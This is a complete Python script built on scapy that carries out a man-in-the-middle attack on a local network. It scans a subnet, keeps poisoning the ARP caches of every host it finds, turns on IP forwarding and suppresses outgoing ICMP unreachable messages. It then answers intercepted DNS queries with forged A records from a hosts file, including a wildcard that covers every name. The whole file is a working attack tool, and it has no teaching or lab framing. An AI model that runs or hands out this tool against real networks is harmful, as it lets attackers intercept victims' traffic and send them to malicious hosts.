from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSRR
from scapy.layers.l2 import Ether, ARP
from scapy.packet import Packet
from scapy.sendrecv import send, sendp, srp, AsyncSniffer
from scapy.all import get_if_addr, Net, get_if_hwaddr
import sys
import os
import subprocess
from itertools import islice
from time import sleep

# CONSTANTS
ARP_SCAN_TIMEOUT = 0.1 # ARP Scan response timeout, in seconds


host_map = {}
iface = ''

def packet_handler(pkt: Packet):
    l_eth = pkt.getlayer(Ether)
    l_ip = pkt.getlayer(IP)
    l_udp = pkt.getlayer(UDP)
    l_dns = pkt.getlayer(DNS)

    # For A Records:
    if l_dns.qr == 0 and l_dns.opcode == 0:
        query_host = l_dns.qd.qname[:-1].decode()
        res_ip = None

        if host_map.get(query_host):
            res_ip = host_map.get(query_host)
        
        elif host_map.get("*"):
            res_ip = host_map.get("*")

        if res_ip:
            dns_ans = DNSRR( rrname = query_host + ".", ttl=330, type="A", rclass='IN', rdata=res_ip)

            reply = Ether(dst=l_eth.src, src=get_if_hwaddr(iface))/IP(src=l_ip.dst, dst=l_ip.src)/UDP(sport=l_udp.dport, dport=l_udp.sport)/\
                DNS(id = l_dns.id, qr=1,aa=0,rcode=0, qd=l_dns.qd, an=dns_ans)

            print("Sending DNS record to host at " + str(l_ip.src))

            sendp(reply, iface=iface, verbose=False)




def parse_hosts(fname):
    for l in open(fname):
        l = l.strip('\n')

        if l:
            (ip, hst) = l.split()
            host_map[hst] = ip



def help_text():
    print("\nUsage:\n python dns_arp_poisoning.py interface hosts_file network \nExample:\n python dns_arp_poisoning.py eth0 /hosts_file 10.0.0.0/24")
    sys.exit()

# Arp poisoning functions


def getmac(IP,iface):
    ans,unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = ARP_SCAN_TIMEOUT, iface = iface, inter = 0.1, verbose=False)
    if len(ans) == 0:
        return None
    for snd,rcv in ans:
        return rcv.sprintf(r"%Ether.src%")

def spoofarpcache(targetip, targetmac, sourceip):
	spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
	send(spoofed, verbose= False,count=1)

def restorearp(targetip, targetmac, sourceip, sourcemac):
	packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
	send(packet, verbose=False,count=1)

def ARP_poison(network, iface, mac_list):
    for addr1 in network:
        tmac = mac_list[addr1]
        for addr2 in network:
            if addr1 != addr2 and addr1 not in [get_if_addr(iface)] and addr2 not in [get_if_addr(iface)]:
                spoofarpcache(addr1, tmac, addr2)

def ARP_restore(network, iface, mac_list):
    for addr1 in network:
        for addr2 in network:
            if addr1 != addr2 and addr1 not in [get_if_addr(iface)] and addr2 not in [get_if_addr(iface)]:
                tmac_1 = mac_list[addr1]
                tmac_2 = mac_list[addr2]
                if tmac_1 != None and tmac_2 != None:
                    restorearp(addr1, tmac_1, addr2, tmac_2)

# IP Forwarding

def enable_ip_forwarding(interface):
    print("\n[*] Enabling IP forwarding and disabling ICMP redirects...\n")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    os.system("echo 0 > /proc/sys/net/ipv4/conf/" + interface + "/send_redirects")
    os.system("echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects")

def disable_ip_forwarding():
    print("[*] Disabling IP forwarding...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        help_text()
    
    iface = sys.argv[1]
    hosts_file = sys.argv[2]
    network = sys.argv[3]
    network_len = pow(2,32-int(network.split('/')[1]))

    enable_ip_forwarding(iface)

    
    subprocess.run(['iptables', '-A', 'OUTPUT', '-p', 'icmp', '--icmp-type', 'destination-unreachable', '-j', 'DROP'])

    # Get list of network mac addresses
    mac_list = {}

    print("Scanning hosts for MAC addresses...")

    for addr in islice(Net(network),1,network_len-1):
        mac_list[addr] = getmac(addr,iface)

    host_list = [k for k in mac_list.keys() if mac_list[k] != None]

    for h in host_list:
        print(h)

    mac_list = {k:mac_list[k] for k in host_list}

    print("Poisoning hosts...")

    ARP_poison(host_list, iface, mac_list)

    print("Finished poisoning ARP caches")

    parse_hosts(hosts_file)

    a_sniff = AsyncSniffer(iface = iface, filter = "udp port 53", prn = packet_handler)
    a_sniff.start()

    try:
        while 1:
            ARP_poison(host_list, iface, mac_list)
            sleep(5)
    except KeyboardInterrupt:
        a_sniff.stop()
        print("Restoring ARP entries")
        ARP_restore(host_list,iface,mac_list)
        disable_ip_forwarding()
        subprocess.run(['iptables', '-D', 'OUTPUT', '-p', 'icmp', '--icmp-type', 'destination-unreachable', '-j', 'DROP'])
        print("Stopped")